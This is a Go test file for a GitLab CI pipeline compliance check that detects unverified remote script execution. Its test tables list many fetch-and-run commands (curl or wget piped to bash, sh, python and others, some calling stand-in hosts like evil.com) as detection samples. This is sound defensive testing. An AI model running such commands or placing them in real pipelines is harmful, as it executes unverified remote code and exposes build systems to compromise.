package control

import (
	"testing"

	"github.com/getplumber/plumber/collector"
	"github.com/getplumber/plumber/gitlab"
)

func buildOriginDataWithScriptJobs(jobs map[string]interface{}) *collector.GitlabPipelineOriginData {
	mergedConf := &gitlab.GitlabCIConf{
		GitlabJobs: jobs,
	}
	return &collector.GitlabPipelineOriginData{
		MergedConf: mergedConf,
		CiValid:    true,
		CiMissing:  false,
	}
}

func TestUnverifiedScripts_Disabled(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: false}
	data := buildOriginDataWithScriptJobs(nil)

	result := conf.Run(data)

	if !result.Skipped {
		t.Fatal("expected control to be skipped when disabled")
	}
	if result.Compliance != 100.0 {
		t.Fatalf("expected compliance 100 when skipped, got %v", result.Compliance)
	}
}

func TestUnverifiedScripts_NilMergedConf(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}
	data := &collector.GitlabPipelineOriginData{
		MergedConf: nil,
		CiValid:    true,
		CiMissing:  false,
	}

	result := conf.Run(data)

	if result.Compliance != 0 {
		t.Fatalf("expected compliance 0 when merged conf unavailable, got %v", result.Compliance)
	}
	if result.Error == "" {
		t.Fatal("expected error message when merged conf unavailable")
	}
}

func TestUnverifiedScripts_NoJobs(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}
	data := buildOriginDataWithScriptJobs(map[string]interface{}{})

	result := conf.Run(data)

	if result.Compliance != 100.0 {
		t.Fatalf("expected compliance 100 with no jobs, got %v", result.Compliance)
	}
	if len(result.Issues) != 0 {
		t.Fatalf("expected 0 issues, got %d", len(result.Issues))
	}
}

// -- Direct pipe-to-shell patterns --

func TestUnverifiedScripts_CurlPipeBash(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}

	tests := []struct {
		name   string
		script string
	}{
		{"curl pipe bash", "curl -fsSL https://example.com/install.sh | bash"},
		{"curl pipe sh", "curl -sSL https://evil.com/script.sh | sh"},
		{"wget pipe bash", "wget -qO- https://example.com/install.sh | bash"},
		{"wget pipe sh", "wget -O - https://example.com/setup.sh | sh"},
		{"curl pipe sudo bash", "curl -fsSL https://get.docker.com | sudo bash"},
		{"curl pipe sudo sh", "curl https://example.com/install.sh | sudo sh"},
		{"curl pipe python", "curl https://example.com/script.py | python"},
		{"curl pipe python3", "curl https://example.com/script.py | python3"},
		{"wget pipe perl", "wget -O- https://example.com/setup.pl | perl"},
		{"curl pipe ruby", "curl -fsSL https://example.com/setup.rb | ruby"},
		{"curl pipe zsh", "curl -fsSL https://example.com/install.sh | zsh"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			jobContent := map[interface{}]interface{}{
				"script": []interface{}{tt.script},
			}
			data := buildOriginDataWithScriptJobs(map[string]interface{}{"install": jobContent})
			result := conf.Run(data)
			if len(result.Issues) != 1 {
				t.Fatalf("script %q should be flagged, expected 1 issue, got %d", tt.script, len(result.Issues))
			}
			if result.Issues[0].PatternType != "pipe-to-shell" {
				t.Fatalf("expected pattern type 'pipe-to-shell', got %q", result.Issues[0].PatternType)
			}
			if result.Compliance != 0.0 {
				t.Fatalf("expected compliance 0, got %v", result.Compliance)
			}
		})
	}
}

// -- Download-and-execute patterns --

func TestUnverifiedScripts_DownloadAndExecute(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}

	tests := []struct {
		name   string
		script string
	}{
		{"curl -o then bash", "curl -o install.sh https://example.com/install.sh && bash install.sh"},
		{"wget -O then sh", "wget -O setup.sh https://example.com/setup.sh && sh setup.sh"},
		{"curl -o then source", "curl -o config.sh https://example.com/config.sh && source config.sh"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			jobContent := map[interface{}]interface{}{
				"script": []interface{}{tt.script},
			}
			data := buildOriginDataWithScriptJobs(map[string]interface{}{"setup": jobContent})
			result := conf.Run(data)
			if len(result.Issues) != 1 {
				t.Fatalf("script %q should be flagged, expected 1 issue, got %d", tt.script, len(result.Issues))
			}
			if result.Issues[0].PatternType != "download-and-execute" {
				t.Fatalf("expected pattern type 'download-and-execute', got %q", result.Issues[0].PatternType)
			}
		})
	}
}

// -- Download-redirect-execute patterns --

func TestUnverifiedScripts_DownloadRedirectExecute(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}

	tests := []struct {
		name   string
		script string
	}{
		{"curl redirect then sh", "curl https://example.com/install > install.sh; sh install.sh"},
		{"wget redirect then bash", "wget https://example.com/setup > setup.sh; bash setup.sh"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			jobContent := map[interface{}]interface{}{
				"script": []interface{}{tt.script},
			}
			data := buildOriginDataWithScriptJobs(map[string]interface{}{"setup": jobContent})
			result := conf.Run(data)
			if len(result.Issues) != 1 {
				t.Fatalf("script %q should be flagged, expected 1 issue, got %d", tt.script, len(result.Issues))
			}
			if result.Issues[0].PatternType != "download-redirect-execute" {
				t.Fatalf("expected pattern type 'download-redirect-execute', got %q", result.Issues[0].PatternType)
			}
		})
	}
}

// -- Safe patterns that should NOT be flagged --

func TestUnverifiedScripts_SafePatterns(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}

	tests := []struct {
		name   string
		script string
	}{
		{"curl to file only", "curl -o installer.sh https://example.com/install.sh"},
		{"wget to file only", "wget https://example.com/setup.sh"},
		{"curl with checksum", "curl -o script.sh https://example.com/script.sh && sha256sum -c script.sh.sha256 && bash script.sh"},
		{"echo with pipe", "echo 'hello world' | bash -c 'cat'"},
		{"cat pipe bash", "cat local_script.sh | bash"},
		{"normal curl POST", "curl -X POST -d '{\"key\": \"value\"}' https://api.example.com"},
		{"apt-get install", "apt-get install -y curl wget"},
		{"pip install", "pip install requests"},
		{"comment line", "# curl https://example.com/install.sh | bash"},
		{"empty line", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			jobContent := map[interface{}]interface{}{
				"script": []interface{}{tt.script},
			}
			data := buildOriginDataWithScriptJobs(map[string]interface{}{"build": jobContent})
			result := conf.Run(data)
			if len(result.Issues) != 0 {
				t.Fatalf("script %q should be safe, but got %d issues", tt.script, len(result.Issues))
			}
			if result.Compliance != 100.0 {
				t.Fatalf("expected compliance 100, got %v", result.Compliance)
			}
		})
	}
}

// -- Trusted URLs --

func TestUnverifiedScripts_TrustedUrls(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{
		Enabled:     true,
		TrustedUrls: []string{"https://internal.example.com/*", "https://trusted.io/install.sh"},
	}

	tests := []struct {
		name      string
		script    string
		expectHit bool
	}{
		{"trusted wildcard", "curl -fsSL https://internal.example.com/tools/setup.sh | bash", false},
		{"trusted exact", "curl -fsSL https://trusted.io/install.sh | bash", false},
		{"untrusted", "curl -fsSL https://evil.com/hack.sh | bash", true},
		{"exact does not match subpath", "curl -fsSL https://trusted.io/install.sh/evil | bash", true},
		{"without wildcard does not match subpath", "curl -fsSL https://trusted.io/install.sh/extra | bash", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			jobContent := map[interface{}]interface{}{
				"script": []interface{}{tt.script},
			}
			data := buildOriginDataWithScriptJobs(map[string]interface{}{"setup": jobContent})
			result := conf.Run(data)
			if tt.expectHit && len(result.Issues) == 0 {
				t.Fatalf("script %q should be flagged but was not", tt.script)
			}
			if !tt.expectHit && len(result.Issues) > 0 {
				t.Fatalf("script %q should be trusted but got %d issues", tt.script, len(result.Issues))
			}
		})
	}
}

// -- Global scripts --

func TestUnverifiedScripts_GlobalScripts(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}

	mergedConf := &gitlab.GitlabCIConf{
		BeforeScript: []interface{}{"curl https://example.com/setup.sh | bash"},
		AfterScript:  []interface{}{"wget -qO- https://example.com/cleanup.sh | sh"},
		GitlabJobs:   map[string]interface{}{},
	}
	data := &collector.GitlabPipelineOriginData{
		MergedConf: mergedConf,
		CiValid:    true,
		CiMissing:  false,
	}

	result := conf.Run(data)

	if len(result.Issues) != 2 {
		t.Fatalf("expected 2 issues from global scripts, got %d", len(result.Issues))
	}
	for _, issue := range result.Issues {
		if issue.JobName != "(global)" {
			t.Fatalf("expected job name '(global)', got %q", issue.JobName)
		}
	}
}

// -- before_script and after_script in jobs --

func TestUnverifiedScripts_JobScriptBlocks(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}

	jobContent := map[interface{}]interface{}{
		"before_script": []interface{}{"curl https://example.com/pre.sh | bash"},
		"script":        []interface{}{"echo 'safe'"},
		"after_script":  []interface{}{"wget -qO- https://example.com/post.sh | sh"},
	}
	data := buildOriginDataWithScriptJobs(map[string]interface{}{"deploy": jobContent})

	result := conf.Run(data)

	if len(result.Issues) != 2 {
		t.Fatalf("expected 2 issues, got %d", len(result.Issues))
	}

	blocks := map[string]bool{}
	for _, issue := range result.Issues {
		blocks[issue.ScriptBlock] = true
		if issue.JobName != "deploy" {
			t.Fatalf("expected job name 'deploy', got %q", issue.JobName)
		}
	}
	if !blocks["before_script"] || !blocks["after_script"] {
		t.Fatal("expected issues in both before_script and after_script")
	}
}

// -- Multiple issues in one job --

func TestUnverifiedScripts_MultipleIssuesPerJob(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}

	jobContent := map[interface{}]interface{}{
		"script": []interface{}{
			"curl https://example.com/first.sh | bash",
			"echo 'safe command'",
			"wget -qO- https://example.com/second.sh | sh",
		},
	}
	data := buildOriginDataWithScriptJobs(map[string]interface{}{"multi": jobContent})

	result := conf.Run(data)

	if len(result.Issues) != 2 {
		t.Fatalf("expected 2 issues, got %d", len(result.Issues))
	}
	if result.Metrics.UnverifiedScriptsFound != 2 {
		t.Fatalf("expected 2 unverified scripts in metrics, got %d", result.Metrics.UnverifiedScriptsFound)
	}
}

// -- Issue code and DocURL --

func TestUnverifiedScripts_IssueCodeAndDocURL(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}

	jobContent := map[interface{}]interface{}{
		"script": []interface{}{"curl https://example.com/install.sh | bash"},
	}
	data := buildOriginDataWithScriptJobs(map[string]interface{}{"install": jobContent})

	result := conf.Run(data)

	if len(result.Issues) != 1 {
		t.Fatalf("expected 1 issue, got %d", len(result.Issues))
	}

	issue := result.Issues[0]
	if issue.Code != CodeUnverifiedScriptExecution {
		t.Fatalf("expected code %s, got %s", CodeUnverifiedScriptExecution, issue.Code)
	}
	if issue.DocURL != CodeUnverifiedScriptExecution.DocURL() {
		t.Fatalf("expected DocURL %s, got %s", CodeUnverifiedScriptExecution.DocURL(), issue.DocURL)
	}
}

// -- Case insensitivity --

func TestUnverifiedScripts_CaseInsensitive(t *testing.T) {
	conf := &GitlabPipelineUnverifiedScriptsConf{Enabled: true}

	tests := []struct {
		name   string
		script string
	}{
		{"CURL pipe BASH", "CURL -fsSL https://example.com/install.sh | BASH"},
		{"Curl pipe Bash", "Curl -fsSL https://example.com/install.sh | Bash"},
		{"WGET pipe SH", "WGET -qO- https://example.com/setup.sh | SH"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			jobContent := map[interface{}]interface{}{
				"script": []interface{}{tt.script},
			}
			data := buildOriginDataWithScriptJobs(map[string]interface{}{"build": jobContent})
			result := conf.Run(data)
			if len(result.Issues) != 1 {
				t.Fatalf("script %q should be flagged (case insensitive), expected 1 issue, got %d", tt.script, len(result.Issues))
			}
		})
	}
}
